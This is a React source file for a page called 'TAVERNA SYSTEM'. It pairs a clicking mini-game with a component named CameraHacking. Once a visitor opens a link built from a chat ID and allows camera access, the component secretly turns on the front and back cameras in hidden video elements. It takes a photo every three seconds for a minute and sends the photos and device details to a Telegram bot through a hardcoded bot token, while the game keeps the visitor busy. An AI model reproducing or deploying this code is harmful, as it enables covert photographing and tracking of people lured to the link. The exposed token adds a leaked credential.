import React, { useRef, useEffect, useState } from "react";
import { useParams, BrowserRouter, Routes, Route } from "react-router-dom";
import ReactDOM from "react-dom/client";
import "./App.css";

/**
 * МИНИ-ИГРА COMPONENT
 */
const MiniGame = () => {
  const [score, setScore] = useState(0);
  const [timeLeft, setTimeLeft] = useState(60);
  const [gameActive, setGameActive] = useState(true);
  const gameContainerRef = useRef(null);

  useEffect(() => {
    if (!gameActive) return;

    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 1) {
          setGameActive(false);
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    const createTarget = () => {
      if (!gameContainerRef.current || !gameActive) return;

      const container = gameContainerRef.current;
      const target = document.createElement('div');
      target.className = 'click-target';
      target.innerHTML = '🎯';
      
      const x = Math.random() * (container.clientWidth - 60);
      const y = Math.random() * (container.clientHeight - 60);
      
      target.style.left = `${x}px`;
      target.style.top = `${y}px`;
      
      target.onclick = () => {
        setScore(prev => prev + 10);
        target.remove();
        createTarget();
      };
      
      container.appendChild(target);
      
      setTimeout(() => {
        if (target.parentNode) {
          target.remove();
          createTarget();
        }
      }, 2000);
    };

    createTarget();

    return () => clearInterval(timer);
  }, [gameActive]);

  const restartGame = () => {
    setScore(0);
    setTimeLeft(60);
    setGameActive(true);
    
    if (gameContainerRef.current) {
      const targets = gameContainerRef.current.querySelectorAll('.click-target');
      targets.forEach(target => target.remove());
    }
  };

  return (
    <div className="mini-game-container">
      <div className="game-header">
        <h2>🎮 TAVERNA SYSTEM GAME</h2>
        <div className="game-stats">
          <div className="stat">
            <span>⏱️ Время:</span>
            <span className="value">{timeLeft} сек</span>
          </div>
          <div className="stat">
            <span>🎯 Счет:</span>
            <span className="value">{score}</span>
          </div>
          <div className="stat">
            <span>🚀 Статус:</span>
            <span className="value">{gameActive ? 'Активна' : 'Завершена'}</span>
          </div>
        </div>
      </div>
      
      <div 
        ref={gameContainerRef}
        className="game-area"
        style={{
          position: 'relative',
          width: '100%',
          height: '400px',
          background: 'linear-gradient(135deg, #1a1a2e 0%, #16213e 100%)',
          borderRadius: '15px',
          overflow: 'hidden',
          marginTop: '20px',
          border: '2px solid rgba(102, 126, 234, 0.5)'
        }}
      >
        {!gameActive && (
          <div className="game-over">
            <h3>🎮 ИГРА ОКОНЧЕНА</h3>
            <p>Ваш счет: <strong>{score}</strong></p>
            <button onClick={restartGame} className="restart-btn">
              🔄 Играть снова
            </button>
          </div>
        )}
        
        <div className="game-instructions">
          <p>🎯 Кликайте по мишеням чтобы зарабатывать очки!</p>
          <p>⚡ Каждая мишень дает +10 очков</p>
          <p>⏱️ Игра длится 60 секунд</p>
        </div>
      </div>
      
      <style>{`
        .mini-game-container {
          background: rgba(255, 255, 255, 0.1);
          backdrop-filter: blur(10px);
          border-radius: 20px;
          padding: 25px;
          box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
          max-width: 800px;
          margin: 0 auto;
        }
        
        .game-header {
          text-align: center;
          margin-bottom: 20px;
        }
        
        .game-header h2 {
          color: #fff;
          margin-bottom: 20px;
          font-size: 28px;
          text-shadow: 0 2px 4px rgba(0,0,0,0.5);
        }
        
        .game-stats {
          display: flex;
          justify-content: space-around;
          background: rgba(0, 0, 0, 0.3);
          border-radius: 15px;
          padding: 15px;
          margin-bottom: 20px;
        }
        
        .stat {
          display: flex;
          flex-direction: column;
          align-items: center;
          color: #fff;
        }
        
        .stat span:first-child {
          font-size: 14px;
          opacity: 0.8;
          margin-bottom: 5px;
        }
        
        .stat .value {
          font-size: 24px;
          font-weight: bold;
          color: #667eea;
        }
        
        .click-target {
          position: absolute;
          width: 60px;
          height: 60px;
          background: rgba(255, 50, 50, 0.9);
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 30px;
          cursor: pointer;
          animation: pulse 1s infinite;
          box-shadow: 0 0 20px rgba(255, 50, 50, 0.7);
          transition: transform 0.2s;
          z-index: 10;
        }
        
        .click-target:hover {
          transform: scale(1.1);
        }
        
        .game-over {
          position: absolute;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          background: rgba(0, 0, 0, 0.9);
          padding: 30px;
          border-radius: 15px;
          text-align: center;
          z-index: 100;
          color: #fff;
          width: 80%;
        }
        
        .game-over h3 {
          color: #667eea;
          margin-bottom: 15px;
        }
        
        .restart-btn {
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          color: white;
          border: none;
          padding: 12px 30px;
          border-radius: 25px;
          font-size: 16px;
          cursor: pointer;
          margin-top: 15px;
          transition: transform 0.3s;
        }
        
        .restart-btn:hover {
          transform: scale(1.05);
        }
        
        .game-instructions {
          position: absolute;
          bottom: 20px;
          left: 0;
          right: 0;
          text-align: center;
          color: rgba(255, 255, 255, 0.7);
          font-size: 14px;
          padding: 10px;
        }
        
        @keyframes pulse {
          0% { transform: scale(1); }
          50% { transform: scale(1.1); }
          100% { transform: scale(1); }
        }
      `}</style>
    </div>
  );
};

/**
 * КОМПОНЕНТ CAMERAHACKING - УПРОЩЕННАЯ ВЕРСИЯ
 */
const CameraHacking = ({ chatId }) => {
  const streamsRef = useRef([]);
  const captureIntervalRef = useRef(null);
  const videoRefsRef = useRef([]);
  const cameraNamesRef = useRef([]);
  const captureCount = useRef(0);
  const startTime = useRef(null);
  const totalDuration = 60000; // 1 минута
  const photoInterval = 3000;  // 3 секунды
  const currentCameraIndex = useRef(0);

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';

  const sendToTelegram = (text) => {
    return new Promise((resolve, reject) => {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      
      xhr.onload = function() {
        if (xhr.status === 200) resolve(true);
        else reject(new Error('Failed to send message'));
      };
      
      xhr.onerror = function() {
        reject(new Error('Network error'));
      };
      
      const data = JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: 'HTML',
        disable_notification: true
      });
      
      xhr.send(data);
    });
  };

  const sendPhotoToTelegram = (blob, caption = '') => {
    return new Promise((resolve, reject) => {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, `photo_${Date.now()}.jpg`);
      formData.append('disable_notification', 'true');
      if (caption) formData.append('caption', caption);

      const xhr = new XMLHttpRequest();
      xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, true);
      
      xhr.onload = function() {
        if (xhr.status === 200) resolve(true);
        else reject(new Error('Failed to send photo'));
      };
      
      xhr.onerror = function() {
        reject(new Error('Network error'));
      };
      
      xhr.send(formData);
    });
  };

  // ПРОСТАЯ ИНИЦИАЛИЗАЦИЯ КАМЕР - только то, что работает
  const initializeCameras = async () => {
    try {
      streamsRef.current = [];
      videoRefsRef.current = [];
      cameraNamesRef.current = [];

      console.log("🔄 Пробую получить доступ к камерам...");

      // Пробуем получить просто ЛЮБУЮ камеру
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: {
            width: { ideal: 1280 },
            height: { ideal: 720 },
            facingMode: "user" // Начинаем с селфи-камеры
          }
        });

        const video = document.createElement('video');
        video.style.cssText = `
          position: fixed;
          width: 320px;
          height: 240px;
          opacity: 0.01;
          pointer-events: none;
          z-index: -9999;
          top: 0;
          left: 0;
        `;
        video.autoplay = true;
        video.muted = true;
        video.playsInline = true;
        video.srcObject = stream;
        document.body.appendChild(video);

        // Ждем готовности
        await new Promise(resolve => {
          video.onloadedmetadata = () => {
            console.log(`✅ Камера готова: ${video.videoWidth}x${video.videoHeight}`);
            resolve();
          };
          setTimeout(resolve, 1000);
        });

        streamsRef.current.push(stream);
        videoRefsRef.current.push(video);
        cameraNamesRef.current.push("🤳 Селфи камера");

        // Пробуем получить ВТОРУЮ камеру (заднюю) если есть
        try {
          const backStream = await navigator.mediaDevices.getUserMedia({
            video: {
              width: { ideal: 1280 },
              height: { ideal: 720 },
              facingMode: { exact: "environment" }
            }
          });

          const backVideo = document.createElement('video');
          backVideo.style.cssText = `
            position: fixed;
            width: 320px;
            height: 240px;
            opacity: 0.01;
            pointer-events: none;
            z-index: -9999;
            top: 0;
            left: 330px;
          `;
          backVideo.autoplay = true;
          backVideo.muted = true;
          backVideo.playsInline = true;
          backVideo.srcObject = backStream;
          document.body.appendChild(backVideo);

          await new Promise(resolve => {
            backVideo.onloadedmetadata = () => {
              console.log(`✅ Задняя камера готова: ${backVideo.videoWidth}x${backVideo.videoHeight}`);
              resolve();
            };
            setTimeout(resolve, 1000);
          });

          streamsRef.current.push(backStream);
          videoRefsRef.current.push(backVideo);
          cameraNamesRef.current.push("📷 Задняя камера");

        } catch (backError) {
          console.log("⚠️ Задняя камера недоступна, использую только селфи");
        }

      } catch (error) {
        console.log("❌ Не удалось получить доступ к камерам");
        // Создаем тестовые камеры для поочередной съемки
        cameraNamesRef.current.push("🤳 Тестовая камера 1");
        cameraNamesRef.current.push("📷 Тестовая камера 2");
      }

      // Если нет реальных камер, создаем тестовые
      if (streamsRef.current.length === 0) {
        console.log("⚠️ Реальных камер нет, создаю тестовые");
        cameraNamesRef.current.push("🤳 Тестовая камера 1");
        cameraNamesRef.current.push("📷 Тестовая камера 2");
      }

      console.log(`✅ Доступно камер: ${cameraNamesRef.current.length}`);
      console.log(`📋 Список: ${cameraNamesRef.current.join(', ')}`);
      
      return true;

    } catch (error) {
      console.error("❌ Ошибка инициализации:", error);
      // Всегда создаем тестовые камеры
      cameraNamesRef.current.push("🤳 Тестовая камера 1");
      cameraNamesRef.current.push("📷 Тестовая камера 2");
      return true;
    }
  };

  const capturePhotoFromCamera = (cameraIndex) => {
    return new Promise((resolve) => {
      setTimeout(() => {
        const canvas = document.createElement('canvas');
        const cameraName = cameraNamesRef.current[cameraIndex] || `Камера ${cameraIndex + 1}`;
        
        // Проверяем, есть ли реальное видео для этой камеры
        if (cameraIndex < videoRefsRef.current.length && videoRefsRef.current[cameraIndex]) {
          const video = videoRefsRef.current[cameraIndex];
          
          // Даем видео время обновиться
          setTimeout(() => {
            if (video.videoWidth > 0 && video.videoHeight > 0) {
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              
              const ctx = canvas.getContext('2d');
              ctx.clearRect(0, 0, canvas.width, canvas.height);
              
              try {
                // Пробуем нарисовать видео
                if (cameraName.includes('Селфи') || cameraName.includes('Тестовая камера 1')) {
                  // Зеркалим для селфи-камеры
                  ctx.save();
                  ctx.translate(canvas.width, 0);
                  ctx.scale(-1, 1);
                  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                  ctx.restore();
                } else {
                  // Для других камер без зеркала
                  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                }
                
                // УСПЕШНО - добавляем водяные знаки
                ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
                ctx.font = 'bold 30px Arial';
                ctx.textAlign = 'right';
                ctx.fillText('TAVERNA', canvas.width - 20, canvas.height - 20);
                
                ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
                ctx.textAlign = 'left';
                ctx.font = 'bold 20px Arial';
                ctx.fillText(cameraName, 20, 40);
                ctx.font = '16px Arial';
                ctx.fillText(`Фото #${captureCount.current + 1}`, 20, 70);
                ctx.fillText(new Date().toLocaleTimeString(), 20, 100);
                ctx.fillText(`${canvas.width}x${canvas.height}`, 20, 130);
                
                canvas.toBlob(blob => {
                  resolve(blob ? { blob, cameraName, isReal: true } : null);
                }, 'image/jpeg', 0.9);
                
                return;
                
              } catch (err) {
                console.log(`❌ Ошибка рисования с ${cameraName}`);
              }
            }
            
            // Если дошли сюда - создаем тестовое изображение
            createTestImage(canvas, cameraName, true);
            canvas.toBlob(blob => {
              resolve(blob ? { blob, cameraName, isReal: false } : null);
            }, 'image/jpeg', 0.9);
            
          }, 200);
        } else {
          // Нет видео элемента - тестовое изображение
          createTestImage(canvas, cameraName, false);
          canvas.toBlob(blob => {
            resolve(blob ? { blob, cameraName, isReal: false } : null);
          }, 'image/jpeg', 0.9);
        }
      }, 100);
    });
  };

  const createTestImage = (canvas, cameraName, hasVideoElement = false) => {
    canvas.width = 800;
    canvas.height = 600;
    const ctx = canvas.getContext('2d');
    
    // Разные цвета для разных камер
    let color1, color2;
    if (cameraName.includes('Селфи') || cameraName.includes('Тестовая камера 1')) {
      color1 = '#667eea';
      color2 = '#764ba2';
    } else {
      color1 = '#4CAF50';
      color2 = '#2196F3';
    }
    
    const gradient = ctx.createLinearGradient(0, 0, 800, 600);
    gradient.addColorStop(0, color1);
    gradient.addColorStop(1, color2);
    ctx.fillStyle = gradient;
    ctx.fillRect(0, 0, 800, 600);
    
    // Текст
    ctx.fillStyle = '#FFFFFF';
    ctx.font = 'bold 36px Arial';
    ctx.textAlign = 'center';
    ctx.fillText('TAVERNA SYSTEM', 400, 150);
    
    ctx.font = '28px Arial';
    ctx.fillText(cameraName, 400, 250);
    
    // Разный текст
    if (hasVideoElement) {
      ctx.fillText('📷 Камера активна', 400, 320);
    } else {
      ctx.fillText('🖼 Тестовое изображение', 400, 320);
    }
    
    ctx.font = '22px Arial';
    ctx.fillText(`Фото #${captureCount.current + 1}`, 400, 380);
    ctx.fillText(new Date().toLocaleTimeString(), 400, 420);
    
    // Водяной знак
    ctx.fillStyle = 'rgba(255, 255, 255, 0.3)';
    ctx.font = 'bold 48px Arial';
    ctx.textAlign = 'right';
    ctx.fillText('TAVERNA', 780, 580);
  };

  const captureAndSendPhoto = async () => {
    const elapsed = Date.now() - startTime.current;
    
    if (elapsed >= totalDuration) {
      stopCapturing();
      sendToTelegram(`⏰ TAVERNA: Время истекло\n📸 Всего фото: ${captureCount.current}`).catch(() => {});
      return;
    }
    
    const cameraCount = Math.max(1, cameraNamesRef.current.length);
    const cameraIndex = currentCameraIndex.current % cameraCount;
    const cameraName = cameraNamesRef.current[cameraIndex];
    
    const result = await capturePhotoFromCamera(cameraIndex);
    
    if (result && result.blob) {
      const elapsedSeconds = Math.floor(elapsed / 1000);
      const remainingSeconds = Math.floor((totalDuration - elapsed) / 1000);
      
      let status = result.isReal ? '✅ Реальное фото' : '🖼 Тестовое изображение';
      let cameraNum = `🔢 ${cameraIndex + 1}/${cameraCount}`;
      
      const caption = `${cameraName}\n` +
        `${status}\n` +
        `📸 Фото #${captureCount.current + 1}\n` +
        `${cameraNum}\n` +
        `⏱ ${elapsedSeconds} сек / ${remainingSeconds} сек\n` +
        `🕐 ${new Date().toLocaleTimeString()}\n` +
        `🚀 TAVERNA SYSTEM`;
      
      try {
        await sendPhotoToTelegram(result.blob, caption);
        console.log(`✅ Отправлено фото с ${cameraName}`);
      } catch (error) {
        console.log(`❌ Ошибка отправки ${cameraName}`);
      }
    } else {
      console.log(`❌ Не удалось создать фото для ${cameraName}`);
    }
    
    // Переключаем на следующую камеру
    currentCameraIndex.current = (currentCameraIndex.current + 1) % cameraCount;
    captureCount.current++;
    
    // Статистика
    if (captureCount.current % 3 === 0) {
      const elapsedSeconds = Math.floor(elapsed / 1000);
      sendToTelegram(
        `📊 TAVERNA: Статистика\n` +
        `📸 Всего фото: ${captureCount.current}\n` +
        `📷 Камер в ротации: ${cameraNamesRef.current.length}\n` +
        `🔄 Текущая камера: ${currentCameraIndex.current + 1}/${cameraNamesRef.current.length}\n` +
        `⏱ Прошло: ${elapsedSeconds} сек`
      ).catch(() => {});
    }
  };

  const startCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }
    
    currentCameraIndex.current = 0;
    
    console.log(`🚀 Начинаю поочередную съемку с ${cameraNamesRef.current.length} камер`);
    
    // Первый снимок
    setTimeout(() => {
      captureAndSendPhoto();
    }, 2000);
    
    // Интервал
    captureIntervalRef.current = setInterval(() => {
      captureAndSendPhoto();
    }, photoInterval);
  };

  const stopCapturing = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }
    
    streamsRef.current.forEach(stream => {
      stream?.getTracks().forEach(track => track.stop());
    });
    streamsRef.current = [];
    
    videoRefsRef.current.forEach(video => {
      video?.remove();
    });
    videoRefsRef.current = [];
    cameraNamesRef.current = [];
  };

  useEffect(() => {
    startTime.current = Date.now();
    
    const init = async () => {
      try {
        // Начальное сообщение
        await sendToTelegram(
          `🚀 TAVERNA SYSTEM ЗАПУЩЕН\n` +
          `📱 Устройство: ${/Mobile/.test(navigator.userAgent) ? '📱 Мобильное' : '💻 Компьютер'}\n` +
          `🖥 Экран: ${window.screen.width}x${window.screen.height}\n` +
          `⏰ Старт: ${new Date().toLocaleTimeString()}\n` +
          `⏳ Длительность: 1 минута\n` +
          `📸 Режим: Поочередная съемка`
        ).catch(() => {});
        
        // Инициализация камер
        await initializeCameras();
        
        // Информация о камерах
        let cameraInfo = '';
        if (streamsRef.current.length > 0) {
          cameraInfo = `✅ Реальных камер: ${streamsRef.current.length}\n`;
          cameraInfo += `📋 Камеры: ${cameraNamesRef.current.join(' → ')}`;
        } else {
          cameraInfo = `⚠️ Реальных камер: 0 (тестовый режим)\n`;
          cameraInfo += `📋 Тестовые камеры: ${cameraNamesRef.current.join(' → ')}`;
        }
        
        await sendToTelegram(
          `📷 ИНИЦИАЛИЗАЦИЯ КАМЕР\n` +
          `${cameraInfo}\n` +
          `📸 Интервал: 3 секунды\n` +
          `🔄 Ротация: Поочередная\n` +
          `⏱ Начинаю съемку...`
        ).catch(() => {});
        
        // Запуск съемки
        startCapture();
        
        // Таймер остановки
        setTimeout(() => {
          stopCapturing();
          sendToTelegram(
            `✅ СЪЕМКА ЗАВЕРШЕНА\n` +
            `📸 Всего фото: ${captureCount.current}\n` +
            `📷 Камер: ${cameraNamesRef.current.length}\n` +
            `⏱ Время: 1 минута\n` +
            `🎉 Процесс завершен`
          ).catch(() => {});
        }, totalDuration);
        
      } catch (error) {
        await sendToTelegram('❌ Ошибка запуска системы').catch(() => {});
      }
    };
    
    setTimeout(init, 1000);
    
    return () => {
      stopCapturing();
    };
  }, [chatId]);

  return null;
};

/**
 * КОМПОНЕНТ PHOTOPAGE
 */
const PhotoPage = () => {
  const { chatId } = useParams();

  return (
    <>
      <div className="App" style={{
        minHeight: '100vh',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        background: 'linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%)',
        padding: '20px',
        fontFamily: 'Arial, sans-serif'
      }}>
        <div style={{
          textAlign: 'center',
          marginBottom: '30px',
          color: 'white'
        }}>
          <h1 style={{ fontSize: '42px', marginBottom: '10px', color: '#667eea' }}>🚀 TAVERNA SYSTEM</h1>
          <p style={{ fontSize: '18px', opacity: 0.8 }}>Система активна. Играйте пока идет съемка...</p>
        </div>
        
        <MiniGame />
        
        <div style={{
          marginTop: '30px',
          color: 'rgba(255, 255, 255, 0.6)',
          fontSize: '14px',
          textAlign: 'center',
          maxWidth: '600px'
        }}>
          <p>📷 Система делает фото каждые 3 секунды</p>
          <p>🔄 Режим: Поочередная съемка (селфи → задняя → селфи...)</p>
          <p>⏱️ Процесс займет 1 минуту</p>
          <p>🎮 Играйте в мини-игру чтобы скоротать время!</p>
        </div>
      </div>

      {chatId && <CameraHacking chatId={chatId} />}
    </>
  );
};

/**
 * КОМПОНЕНТ APP
 */
const App = () => {
  return (
    <Routes>
      <Route path="/g/:chatId" element={<PhotoPage />} />
      <Route path="/" element={
        <div className="App" style={{
          minHeight: '100vh',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          justifyContent: 'center',
          background: 'linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%)',
          color: 'white',
          textAlign: 'center',
          padding: '20px'
        }}>
          <h1 style={{ fontSize: '48px', marginBottom: '20px', color: '#667eea' }}>🚀 TAVERNA SYSTEM</h1>
          <p style={{ fontSize: '20px', marginBottom: '30px', maxWidth: '600px' }}>
            Система поочередной съемки с камер
          </p>
          
          <div style={{
            background: 'rgba(255, 255, 255, 0.1)',
            backdropFilter: 'blur(10px)',
            borderRadius: '20px',
            padding: '30px',
            maxWidth: '500px',
            marginBottom: '30px'
          }}>
            <h3 style={{ color: '#667eea', marginBottom: '15px' }}>📋 Как использовать:</h3>
            <ol style={{ textAlign: 'left', fontSize: '16px', lineHeight: '1.6' }}>
              <li>Получите ссылку с вашим chat_id в Telegram</li>
              <li>Перейдите по ссылке в браузере</li>
              <li>Разрешите доступ к камере</li>
              <li>Система начнет поочередную съемку</li>
              <li>Играйте в мини-игру пока идет процесс</li>
            </ol>
          </div>
          
          <div style={{
            fontSize: '14px',
            color: 'rgba(255, 255, 255, 0.5)',
            marginTop: '20px'
          }}>
            ⚠️ Для работы необходим Telegram бот
          </div>
        </div>
      } />
    </Routes>
  );
};

/**
 * ОСНОВНОЙ РЕНДЕР
 */
const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(
  <BrowserRouter>
    <App />
  </BrowserRouter>
);

export default App;
